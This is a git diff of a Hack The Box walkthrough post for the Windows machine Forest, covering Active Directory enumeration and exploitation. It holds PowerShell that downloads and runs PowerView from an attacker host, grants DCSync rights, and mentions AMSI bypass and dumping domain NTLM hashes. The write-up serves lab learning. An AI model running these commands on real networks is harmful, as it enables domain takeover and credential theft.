@@ -4,6 +4,9 @@ date: 2025-04-14 13:00:00
 categories: [HTB Machines,Windows Machines]
 tags: [ad,asreproast,ad,bloodhound,dcsync]     # TAG names should always be lowercase
 comments: true
+image:
+  path: /./media/post2/forest.png
+  alt: image alternative text
 ---
 **Hello** This is a very simple walkthrough for the windows machine Forest. In this walkthrough we'll be see some basic AD enumeration and Exploitation, without further ado let's get into it 
 # Enumeration
@@ -74,10 +77,10 @@ before loading the script we should use the **bypassAMSI** option in the menu.
 
 Next, we can use the **Add-ObjectACL** with john's credentials, and give him **DCSync** rights.
 ```powershell
-> iex(new-object net.webclient).downloadstring('http://$IP:8090/PowerView.ps1')
-> $SecPassword = Convertto-SecureString 'psswd123' -AsPlainText -force
-> $Cred = New-Object System.Management.Automation.PSCredential('htb\jason', $SecPassword)
-> Add-objectACL -PrincipalIdentity jason -Credential $Cred -Rights DCSync
+iex(new-object net.webclient).downloadstring('http://$IP:8090/PowerView.ps1')
+$SecPassword = Convertto-SecureString 'psswd123' -AsPlainText -force
+$Cred = New-Object System.Management.Automation.PSCredential('htb\jason', $SecPassword)
+Add-objectACL -PrincipalIdentity jason -Credential $Cred -Rights DCSync
 ````
 The **secretsdump.py** script from Impacket can now be run as john, and used to reveal the NTLM
 hashes for all domain users.
